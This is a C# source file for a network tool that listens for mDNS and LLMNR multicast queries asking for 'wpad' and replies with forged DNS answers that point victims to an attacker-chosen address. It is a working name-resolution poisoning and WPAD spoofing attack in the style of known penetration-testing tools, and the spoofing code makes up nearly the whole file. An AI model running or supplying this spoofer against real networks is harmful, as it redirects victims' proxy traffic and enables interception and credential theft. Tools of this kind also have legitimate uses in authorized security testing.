using System.Net;
using System.Net.Sockets;
using System.Text;

public abstract class ParameterBase
{
    protected readonly IPAddress AdvertisedAddress;
    protected readonly IPAddress BindAddress;
    protected readonly int Duration;

    protected ParameterBase(IPAddress advertisedAddress, IPAddress bindAddress, int duration)
    {
        AdvertisedAddress = advertisedAddress;
        BindAddress = bindAddress;
        Duration = duration;
    }
}


public class MdnsSniffer : ParameterBase

{
    public MdnsSniffer(IPAddress advertisedAddress, IPAddress bindAddress, int duration)

    :base(advertisedAddress, bindAddress, duration) {}

    public async Task RunAsync()
        {

            const int MdnsPort = 5353;
            var multicastAddress = IPAddress.Parse("224.0.0.251");

            using var udp = new UdpClient(AddressFamily.InterNetwork);

            // Allow multiple listeners (common for mDNS)
            udp.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
            try { udp.Client.ExclusiveAddressUse = false; } catch { /* ignore on platforms that disallow */ };

            udp.Client.Bind(new IPEndPoint(BindAddress, MdnsPort));

            udp.JoinMulticastGroup(multicastAddress);


            Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] Listening for {Duration}m for mDNS queries on 224.0.0.251:5353 ... (Ctrl+C to quit)");
            
        using var cts = new CancellationTokenSource(TimeSpan.FromMinutes(Duration));

        while (!cts.Token.IsCancellationRequested)
            {
                try
                {
                    var result = await udp.ReceiveAsync().WaitAsync(cts.Token);
                    var buf = result.Buffer;            // raw packet data (bytes)
                    var remote = result.RemoteEndPoint; // IP/port of sender

                    try
                    {
                        // Try to parse the packet as a DNS message.
                        int offset = 12;
                        string name = Parser.ReadNameSimple(buf, ref offset);
                        //Console.WriteLine($"Name: {name}");
                        ushort txId = Parser.ReadUInt16(buf, 0);
                        ushort ancount = Parser.ReadUInt16(buf, 6);
                        //only respond to Questions to avoid Answer loop
                        bool isQuestion = ancount == 0;

                        if (name.Contains("wpad", StringComparison.OrdinalIgnoreCase) && isQuestion)
                        {
                            byte[] response = Parser.BuildMdnsAResponse(name, AdvertisedAddress, txId);
                            Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] mDNS WPAD Traffic found from {remote.Address}! Sending Response...");

                            var sent = await udp.SendAsync(response, response.Length, remote);

                        }

                    }

                    catch (Exception ex)
                    {
                        Console.WriteLine("  Parse error: " + ex.Message);
                    }

                }
                catch (OperationCanceledException)
                {
                    // This is how the loop ends when the timer/token cancels
                    break;
                }

                catch (SocketException sx)
                {
                    // Thrown when a low-level network error occurs (connection reset, etc.)
                    Console.WriteLine("Socket error: " + sx.Message);
                    break;
                }
            }
        }
    }


public class LLMNRSniffer : ParameterBase

{
    public LLMNRSniffer(IPAddress advertisedAddress, IPAddress bindAddress, int duration)

    : base(advertisedAddress, bindAddress, duration) { }

    public async Task RunAsync()
    {

        const int LLMNRPort = 5355;
        var multicastAddress = IPAddress.Parse("224.0.0.252");

        using var udp = new UdpClient(AddressFamily.InterNetwork);

        // Allow multiple listeners (common for LLMNR)
        udp.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
        try { udp.Client.ExclusiveAddressUse = false; } catch { /* ignore on platforms that disallow */ };

        udp.Client.Bind(new IPEndPoint(BindAddress, LLMNRPort));

        udp.JoinMulticastGroup(multicastAddress);


        Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] Listening for {Duration}m for LLMNR queries on 224.0.0.252:5355 ... (Ctrl+C to quit)\n");

        using var cts = new CancellationTokenSource(TimeSpan.FromMinutes(Duration));

        while (!cts.Token.IsCancellationRequested)
        {
            try
            {
                var result = await udp.ReceiveAsync().WaitAsync(cts.Token);
                var buf = result.Buffer;            // raw packet data (bytes)
                var remote = result.RemoteEndPoint; // IP/port of sender

                try
                {
                    // Try to parse the packet as a DNS message.
                    int offset = 12;
                    string name = Parser.ReadNameSimple(buf, ref offset);
                    //Console.WriteLine($"Name: {name}");

                    ushort ancount = Parser.ReadUInt16(buf, 6);
                    ushort txId = Parser.ReadUInt16(buf, 0);
                    //only respond to Questions to avoid Answer loop
                    bool isQuestion = ancount == 0;

                    if (name.Contains("wpad", StringComparison.OrdinalIgnoreCase) && isQuestion)
                    {
                        byte[] response = Parser.BuildMdnsAResponse(name, AdvertisedAddress, txId);
                        Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] LLMNR WPAD Traffic found from {remote.Address}! Sending Response...");

                        var sent = await udp.SendAsync(response, response.Length, remote);

                    }

                }

                catch (Exception ex)
                {
                    Console.WriteLine("  Parse error: " + ex.Message);
                }

            }
            catch (OperationCanceledException)
            {
                // This is how the loop ends when the timer/token cancels
                //Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] Closing Bind Port and Terminating program.");
                break;
            }

            catch (SocketException sx)
            {
                // Thrown when a low-level network error occurs (connection reset, etc.)
                Console.WriteLine("Socket error: " + sx.Message);
                break;
            }
        }

    }

}

public static class Parser {

    public static ushort ReadUInt16(byte[] b, int i) => (ushort)((b[i] << 8) | b[i + 1]);
    private static void WriteName(List<byte> b, string fqdn)
    {
        foreach (var label in fqdn.Split('.'))
        {
            if (label.Length == 0) continue;
            b.Add((byte)label.Length);
            b.AddRange(Encoding.UTF8.GetBytes(label));
        }
        b.Add(0); // end of name
    }

    public static byte[] BuildMdnsAResponse(string fqdn, IPAddress ipv4, ushort txId)
    {
        if (ipv4.AddressFamily != AddressFamily.InterNetwork)
            throw new ArgumentException("Only IPv4 supported in this helper");

        var bytes = new List<byte>(256);

        // --- DNS Header (12 bytes) ---
        // ID=0 for mDNS, QR=1 (response), AA=1 (authoritative), others 0.
        // Flags: 1000 0000 0000 0000 (QR) + 0000 0100 0000 0000 (AA) = 0x8400
        ushort flags = 0x8400;
        ushort qd = 0;       // we don't echo the question
        ushort an = 1;       // one answer
        ushort ns = 0;
        ushort ar = 0;

        void W16(ushort v) { bytes.Add((byte)(v >> 8)); bytes.Add((byte)(v & 0xFF)); }
        //Build mDNS header
        W16(txId);
        W16(flags);
        W16(qd);
        W16(an);
        W16(ns);
        W16(ar);

        // --- Answer RR ---
        // NAME
        WriteName(bytes, fqdn);

        // TYPE = A (1), CLASS = IN (1) with cache-flush bit set (0x8000)
        W16(1);                   // TYPE A
        W16(1);// CLASS IN with no cache flush

        // TTL: typical mDNS TTL for address records is 120 seconds
        bytes.Add(0); bytes.Add(0); bytes.Add(0); bytes.Add(120);

        // RDLENGTH = 4, RDATA = IPv4 bytes
        W16(4);
        var addr = ipv4.GetAddressBytes();
        bytes.AddRange(addr);

        return bytes.ToArray();
    }

    public static string ReadNameSimple(byte[] msg, ref int offset)
    {
        var parts = new List<string>();

        while (true)
        {
            // Each label starts with a length byte
            if (offset >= msg.Length)
                throw new IndexOutOfRangeException("Unexpected end of message while reading name.");

            byte len = msg[offset++];

            // 0 means "end of name"
            if (len == 0)
                break;

            if (offset + len > msg.Length)
                throw new IndexOutOfRangeException("Label length exceeds buffer.");

            // Read label and decode as ASCII/UTF-8
            var label = Encoding.UTF8.GetString(msg, offset, len);
            parts.Add(label);

            // Move past this label
            offset += len;
        }

        return string.Join('.', parts);
    }

}